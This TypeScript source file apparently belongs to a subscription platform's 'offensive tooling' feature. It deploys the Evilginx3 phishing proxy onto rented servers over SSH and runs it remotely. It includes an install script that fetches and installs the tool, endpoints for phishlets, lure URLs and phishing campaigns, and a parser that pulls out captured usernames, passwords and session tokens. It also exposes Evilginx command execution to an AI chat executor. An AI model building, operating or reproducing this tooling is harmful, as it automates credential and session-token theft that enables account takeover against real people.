/**
 * Evilginx Router — Dedicated VPS Node Architecture
 *
 * Security model:
 *   Evilginx NEVER runs on the Railway Titan Server.
 *   Each Evilginx instance runs on a SEPARATE dedicated VPS with its own IP.
 *   VPS SSH credentials are encrypted per-user in the DB (AES-256).
 *   The Railway app only orchestrates via SSH — it never stores plaintext creds.
 *   Each node gets firewall rules that block inbound reverse connections.
 *   Per-campaign isolation: different phishing campaigns use different nodes.
 *
 * Node lifecycle:
 *   addNode    → save VPS SSH creds to DB (encrypted)
 *   deployNode → SSH into VPS, install Evilginx3, configure, start
 *   checkNode  → verify Evilginx is running on the node
 *   removeNode → stop Evilginx, remove node from DB
 *   exec       → run any Evilginx command on the active node
 *   All phishlet/lure/session operations target the active node
 */

import { z } from "zod";
import { router, protectedProcedure } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { getUserPlan, enforceFeature } from "./subscription-gate";
import { getDb } from "./db";
import { userSecrets } from "../drizzle/schema";
import { eq, and } from "drizzle-orm";
import { encrypt, decrypt } from "./fetcher-db";
import { execSSHCommand, type SSHConfig } from "./titan-server";
import { createLogger } from "./_core/logger.js";

const log = createLogger("Evilginx");

const SECRET_NODES  = "__evilginx_nodes";
const SECRET_ACTIVE = "__evilginx_active";

// ─── Install script: Evilginx3 + hardened firewall ───────────────────────────
const INSTALL_EVILGINX = [
  "#!/bin/bash",
  "set -e",
  "export DEBIAN_FRONTEND=noninteractive",
  "echo '[Titan] Updating packages...'",
  "apt-get update -qq 2>&1 | tail -1",
  "echo '[Titan] Installing dependencies...'",
  "apt-get install -y -qq wget curl git iptables iptables-persistent 2>&1 | tail -2",
  "",
  "echo '[Titan] Applying firewall (block inbound reverse connections)...'",
  "iptables -F INPUT 2>/dev/null || true",
  "iptables -A INPUT -i lo -j ACCEPT",
  "iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT",
  "iptables -A INPUT -p tcp --dport 22 -j ACCEPT",
  "iptables -A INPUT -p tcp --dport 80 -j ACCEPT",
  "iptables -A INPUT -p tcp --dport 443 -j ACCEPT",
  "iptables -A INPUT -p tcp --dport 53 -j ACCEPT",
  "iptables -A INPUT -p udp --dport 53 -j ACCEPT",
  "iptables -A INPUT -j DROP",
  "mkdir -p /etc/iptables",
  "iptables-save > /etc/iptables/rules.v4 2>/dev/null || true",
  "netfilter-persistent save 2>/dev/null || true",
  "",
  "echo '[Titan] Installing Evilginx3...'",
  "mkdir -p /opt/evilginx",
  "cd /opt/evilginx",
  "ARCH=$(uname -m)",
  "if [ \"$ARCH\" = \"x86_64\" ]; then ARCH_TAG=\"amd64\"; else ARCH_TAG=\"arm64\"; fi",
  "LATEST=$(curl -s https://api.github.com/repos/kgretzky/evilginx2/releases/latest | grep tag_name | cut -d '\"' -f4 2>/dev/null || echo 'v3.3.0')",
  "wget -q \"https://github.com/kgretzky/evilginx2/releases/download/${LATEST}/evilginx_linux_${ARCH_TAG}.tar.gz\" -O evilginx.tar.gz 2>/dev/null || \\",
  "  wget -q \"https://github.com/kgretzky/evilginx2/releases/download/v3.3.0/evilginx_linux_${ARCH_TAG}.tar.gz\" -O evilginx.tar.gz",
  "tar -xzf evilginx.tar.gz",
  "chmod +x evilginx 2>/dev/null || chmod +x evilginx3 2>/dev/null || true",
  "BIN=$(ls /opt/evilginx/evilginx* 2>/dev/null | head -1)",
  "ln -sf \"$BIN\" /usr/local/bin/evilginx",
  "",
  "echo '[Titan] Verifying installation...'",
  "if /usr/local/bin/evilginx -version 2>&1 | grep -qi 'evilginx\\|version'; then",
  "  PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
  "  echo EVILGINX_OK",
  "  echo PUBLIC_IP:$PUBLIC_IP",
  "else",
  "  echo EVILGINX_FAILED",
  "  exit 1",
  "fi",
].join("\n");

const CHECK_EVILGINX = [
  "PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || curl -s --max-time 5 api.ipify.org 2>/dev/null || hostname -I | awk '{print $1}')",
  "if command -v evilginx > /dev/null 2>&1 || [ -f /usr/local/bin/evilginx ]; then echo INSTALLED; else echo NOT_INSTALLED; fi",
  "echo PUBLIC_IP:$PUBLIC_IP",
].join("\n");

const STOP_EVILGINX = "kill $(pgrep evilginx) 2>/dev/null; echo STOPPED";

// ─── Types ────────────────────────────────────────────────────────────────────
export interface EvilginxNode {
  id: string;
  label: string;
  sshHost: string;
  sshPort: number;
  sshUser: string;
  sshPassword?: string;
  sshKey?: string;
  publicIp?: string;
  status: "pending" | "deploying" | "ready" | "running" | "offline" | "error";
  installed: boolean;
  lastChecked?: string;
  country?: string;
  addedAt: string;
  deployedAt?: string;
  errorMessage?: string;
  campaign?: string;
}

// ─── DB helpers ───────────────────────────────────────────────────────────────
async function getNodes(userId: number): Promise<EvilginxNode[]> {
  const db = await getDb();
  if (!db) return [];
  const rows = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
  if (!rows.length) return [];
  try { return JSON.parse(decrypt(rows[0].encryptedValue)) as EvilginxNode[]; } catch { return []; }
}

async function saveNodes(userId: number, nodes: EvilginxNode[]): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  const enc = encrypt(JSON.stringify(nodes));
  const ex = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_NODES))).limit(1);
  if (ex.length) {
    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
  } else {
    await db.insert(userSecrets).values({ userId, secretType: SECRET_NODES, label: "Evilginx Nodes", encryptedValue: enc });
  }
}

async function getActiveNodeId(userId: number): Promise<string | null> {
  const db = await getDb();
  if (!db) return null;
  const rows = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
  if (!rows.length) return null;
  try { return decrypt(rows[0].encryptedValue); } catch { return null; }
}

async function setActiveNodeId(userId: number, nodeId: string | null): Promise<void> {
  const db = await getDb();
  if (!db) throw new Error("Database unavailable");
  const enc = encrypt(nodeId ?? "");
  const ex = await db.select().from(userSecrets)
    .where(and(eq(userSecrets.userId, userId), eq(userSecrets.secretType, SECRET_ACTIVE))).limit(1);
  if (ex.length) {
    await db.update(userSecrets).set({ encryptedValue: enc, updatedAt: new Date() }).where(eq(userSecrets.id, ex[0].id));
  } else {
    await db.insert(userSecrets).values({ userId, secretType: SECRET_ACTIVE, label: "Active Evilginx Node", encryptedValue: enc });
  }
}

async function getActiveNode(userId: number): Promise<EvilginxNode | null> {
  const activeId = await getActiveNodeId(userId);
  if (!activeId) return null;
  const nodes = await getNodes(userId);
  return nodes.find(n => n.id === activeId) ?? null;
}

function nodeToSSH(n: EvilginxNode): SSHConfig {
  return { host: n.sshHost, port: n.sshPort, username: n.sshUser, password: n.sshPassword, privateKey: n.sshKey };
}

function sanitize(n: EvilginxNode): Omit<EvilginxNode, "sshPassword" | "sshKey"> {
  const { sshPassword: _p, sshKey: _k, ...safe } = n;
  return safe;
}

// ─── Evilginx command execution via SSH ──────────────────────────────────────
async function execOnNode(node: EvilginxNode, command: string, timeoutMs = 15000, userId?: number): Promise<string> {
  const safeCmd = command.replace(/[`\\|;&><]/g, "");
  const script = `echo '${safeCmd.replace(/'/g, "'\\''")}' | /usr/local/bin/evilginx -developer 2>&1 || echo "EVILGINX_CMD_FAILED"`;
  return execSSHCommand(nodeToSSH(node), script, timeoutMs, userId);
}

/** Public export for Titan AI chat executor */
export async function execEvilginxCommandPublic(command: string, userId: number, timeoutMs = 10000): Promise<string> {
  const node = await getActiveNode(userId);
  if (!node) return "No active Evilginx node. Add and deploy a dedicated VPS node in the Evilginx settings first.";
  return execOnNode(node, command, timeoutMs, userId);
}

// ─── Parse helpers ────────────────────────────────────────────────────────────
function parsePhishletList(raw: string): Array<{ name: string; hostname: string; status: string; isEnabled: boolean; isHidden: boolean }> {
  const lines = raw.split("\n").filter(l => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("phishlet") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const name = parts[0]?.trim();
      const hostname = parts[1]?.trim() || "";
      const status = parts[2]?.trim()?.toLowerCase() || "disabled";
      if (name && !name.includes("─")) results.push({ name, hostname, status, isEnabled: status === "enabled", isHidden: status === "hidden" });
    }
  }
  return results;
}

function parseLureList(raw: string): Array<{ id: number; phishlet: string; hostname: string; path: string; redirectUrl: string; paused: boolean }> {
  const lines = raw.split("\n").filter(l => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("lure") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 2) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) results.push({ id, phishlet: parts[1]?.trim() || "", hostname: parts[2]?.trim() || "", path: parts[3]?.trim() || "", redirectUrl: parts[4]?.trim() || "", paused: parts[5]?.trim()?.toLowerCase() === "paused" });
    }
  }
  return results;
}

function parseSessionList(raw: string): Array<{ id: number; phishlet: string; username: string; password: string; tokens: boolean; remoteAddr: string; createTime: string }> {
  const lines = raw.split("\n").filter(l => l.trim());
  const results: any[] = [];
  for (const line of lines) {
    if (line.includes("---") || line.includes("session") || line.startsWith(":")) continue;
    const parts = line.trim().split(/\s{2,}/);
    if (parts.length >= 3) {
      const id = parseInt(parts[0]?.trim());
      if (!isNaN(id)) results.push({ id, phishlet: parts[1]?.trim() || "", username: parts[2]?.trim() || "", password: parts[3]?.trim() || "", tokens: parts[4]?.trim()?.toLowerCase() === "captured", remoteAddr: parts[5]?.trim() || "", createTime: parts[6]?.trim() || "" });
    }
  }
  return results;
}

// ─── Router ───────────────────────────────────────────────────────────────────
export const evilginxRouter = router({

  /** List all Evilginx nodes */
  listNodes: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const nodes = await getNodes(ctx.user.id);
    const activeId = await getActiveNodeId(ctx.user.id);
    return { nodes: nodes.map(sanitize), activeNodeId: activeId };
  }),

  /** Add a new dedicated Evilginx VPS node */
  addNode: protectedProcedure
    .input(z.object({
      label: z.string().min(1).max(64),
      sshHost: z.string().min(1),
      sshPort: z.number().int().min(1).max(65535).default(22),
      sshUser: z.string().min(1).default("root"),
      sshPassword: z.string().optional(),
      sshKey: z.string().optional(),
      country: z.string().optional(),
      campaign: z.string().optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      if (!input.sshPassword && !input.sshKey) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "SSH password or private key required." });
      }
      const nodes = await getNodes(ctx.user.id);
      if (nodes.some(n => n.sshHost === input.sshHost && n.sshPort === input.sshPort)) {
        throw new TRPCError({ code: "BAD_REQUEST", message: "Node with this host:port already exists." });
      }
      const node: EvilginxNode = {
        id: crypto.randomUUID(), label: input.label,
        sshHost: input.sshHost, sshPort: input.sshPort, sshUser: input.sshUser,
        sshPassword: input.sshPassword, sshKey: input.sshKey,
        status: "pending", installed: false,
        country: input.country, campaign: input.campaign,
        addedAt: new Date().toISOString(),
      };
      nodes.push(node);
      await saveNodes(ctx.user.id, nodes);
      // Auto-set as active if it's the first node
      const activeId = await getActiveNodeId(ctx.user.id);
      if (!activeId) await setActiveNodeId(ctx.user.id, node.id);
      log.info(`User ${ctx.user.id} added Evilginx node: ${input.label} (${input.sshHost})`);
      return { success: true, node: sanitize(node) };
    }),

  /** Deploy Evilginx3 on a node via SSH */
  deployNode: protectedProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      node.status = "deploying";
      await saveNodes(ctx.user.id, nodes);
      try {
        const output = await execSSHCommand(nodeToSSH(node), INSTALL_EVILGINX, 300000, ctx.user.id);
        if (!output.includes("EVILGINX_OK")) {
          node.status = "error";
          node.errorMessage = "Evilginx installation failed. Check SSH credentials and server access.";
          await saveNodes(ctx.user.id, nodes);
          return { success: false, message: node.errorMessage };
        }
        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
        if (ipMatch) node.publicIp = ipMatch[1];
        node.status = "ready"; node.installed = true;
        node.deployedAt = new Date().toISOString();
        node.lastChecked = new Date().toISOString();
        node.errorMessage = undefined;
        await saveNodes(ctx.user.id, nodes);
        return { success: true, publicIp: node.publicIp, message: `Evilginx3 installed on "${node.label}" at ${node.publicIp}. Ready to use.` };
      } catch (err: any) {
        node.status = "error"; node.errorMessage = err.message;
        await saveNodes(ctx.user.id, nodes);
        return { success: false, message: `Deploy failed: ${err.message}` };
      }
    }),

  /** Check if Evilginx is installed and running on a node */
  checkNode: protectedProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      try {
        const output = await execSSHCommand(nodeToSSH(node), CHECK_EVILGINX, 15000, ctx.user.id);
        const installed = output.includes("INSTALLED");
        const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
        if (ipMatch) node.publicIp = ipMatch[1];
        node.installed = installed;
        node.status = installed ? "ready" : "offline";
        node.lastChecked = new Date().toISOString();
        await saveNodes(ctx.user.id, nodes);
        return { installed, publicIp: node.publicIp, message: installed ? `Evilginx ready on "${node.label}" at ${node.publicIp}` : `Evilginx not installed on "${node.label}"` };
      } catch (err: any) {
        node.status = "offline"; node.lastChecked = new Date().toISOString();
        await saveNodes(ctx.user.id, nodes);
        return { installed: false, message: `SSH failed: ${err.message}` };
      }
    }),

  /** Set the active node for all Evilginx operations */
  setActiveNode: protectedProcedure
    .input(z.object({ nodeId: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      if (!nodes.some(n => n.id === input.nodeId)) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      await setActiveNodeId(ctx.user.id, input.nodeId);
      return { success: true };
    }),

  /** Remove a node */
  removeNode: protectedProcedure
    .input(z.object({ nodeId: z.string(), stopFirst: z.boolean().default(true) }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const nodes = await getNodes(ctx.user.id);
      const idx = nodes.findIndex(n => n.id === input.nodeId);
      if (idx === -1) throw new TRPCError({ code: "NOT_FOUND", message: "Node not found." });
      const node = nodes[idx];
      if (input.stopFirst && node.installed) {
        try { await execSSHCommand(nodeToSSH(node), STOP_EVILGINX, 10000, ctx.user.id); } catch { /* best-effort */ }
      }
      nodes.splice(idx, 1);
      await saveNodes(ctx.user.id, nodes);
      // Clear active if this was it
      const activeId = await getActiveNodeId(ctx.user.id);
      if (activeId === input.nodeId) {
        await setActiveNodeId(ctx.user.id, nodes.length > 0 ? nodes[0].id : null);
      }
      return { success: true, message: `Node "${node.label}" removed` };
    }),

  /** Get status of the active node */
  checkInstall: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) return { installed: false, version: "", path: "", message: "No active node. Add a dedicated VPS node first." };
    try {
      const output = await execSSHCommand(nodeToSSH(node), CHECK_EVILGINX, 15000, ctx.user.id);
      const installed = output.includes("INSTALLED");
      const ipMatch = output.match(/PUBLIC_IP:(\S+)/);
      return { installed, version: installed ? "3.x" : "", path: "/usr/local/bin/evilginx", publicIp: ipMatch?.[1], nodeLabel: node.label };
    } catch (err: any) {
      return { installed: false, version: "", path: "", message: err.message };
    }
  }),

  /** Execute any Evilginx command on the active node */
  exec: protectedProcedure
    .input(z.object({ command: z.string().min(1), timeoutMs: z.number().optional() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node. Add and deploy a dedicated VPS node first." });
      const output = await execOnNode(node, input.command, input.timeoutMs ?? 15000, ctx.user.id);
      return { output, nodeLabel: node.label, publicIp: node.publicIp };
    }),

  /** List phishlets on the active node */
  listPhishlets: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "phishlets", 15000, ctx.user.id);
    return { phishlets: parsePhishletList(raw), raw };
  }),

  enablePhishlet: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `phishlets enable ${input.name}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  disablePhishlet: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `phishlets disable ${input.name}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  hidePhishlet: protectedProcedure
    .input(z.object({ name: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `phishlets hide ${input.name}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  setPhishletHostname: protectedProcedure
    .input(z.object({ name: z.string(), hostname: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `phishlets hostname ${input.name} ${input.hostname}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  listLures: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "lures", 15000, ctx.user.id);
    return { lures: parseLureList(raw), raw };
  }),

  createLure: protectedProcedure
    .input(z.object({ phishlet: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `lures create ${input.phishlet}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  deleteLure: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `lures delete ${input.id}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  getLureUrl: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `lures get-url ${input.id}`, 15000, ctx.user.id);
      const urlMatch = raw.match(/https?:\/\/\S+/);
      return { url: urlMatch?.[0] ?? null, output: raw };
    }),

  listSessions: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "sessions", 15000, ctx.user.id);
    return { sessions: parseSessionList(raw), raw };
  }),

  getSession: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `sessions ${input.id}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  deleteSession: protectedProcedure
    .input(z.object({ id: z.number() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `sessions delete ${input.id}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  setConfig: protectedProcedure
    .input(z.object({ key: z.string(), value: z.string() }))
    .mutation(async ({ ctx, input }) => {
      const plan = await getUserPlan(ctx.user.id);
      enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
      const node = await getActiveNode(ctx.user.id);
      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
      const raw = await execOnNode(node, `config ${input.key} ${input.value}`, 15000, ctx.user.id);
      return { output: raw };
    }),

  getConfig: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active Evilginx node." });
    const raw = await execOnNode(node, "config", 15000, ctx.user.id);
    return { output: raw };
  }),

  // Legacy compatibility procedures (kept for existing UI)
  connectLocal: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    if (!node) return { success: false, message: "No active Evilginx node. Add a dedicated VPS node first.", mode: "none" };
    return { success: true, message: `Connected to "${node.label}" at ${node.publicIp ?? node.sshHost}`, mode: "node", nodeLabel: node.label };
  }),

  getConnection: protectedProcedure.query(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    const node = await getActiveNode(ctx.user.id);
    const nodes = await getNodes(ctx.user.id);
    return {
      connected: !!node,
      mode: node ? "node" : "none",
      nodeLabel: node?.label,
      publicIp: node?.publicIp,
      nodeCount: nodes.length,
      onlineCount: nodes.filter(n => n.status === "ready" || n.status === "running").length,
      // ConnectionConfig-compatible fields for existing EvilginxPage UI
      host: node?.publicIp ?? node?.sshHost ?? "",
      port: node?.sshPort ?? 22,
      username: node?.sshUser ?? "root",
      hasPassword: !!node?.sshPassword,
      hasPrivateKey: !!node?.sshKey,
      isLocal: false,
      version: undefined as string | undefined,
    };
  }),

  disconnect: protectedProcedure.mutation(async ({ ctx }) => {
    const plan = await getUserPlan(ctx.user.id);
    enforceFeature(plan.planId, "offensive_tooling", "Evilginx");
    await setActiveNodeId(ctx.user.id, null);
    return { success: true, message: "Disconnected from active node." };
  }),
});
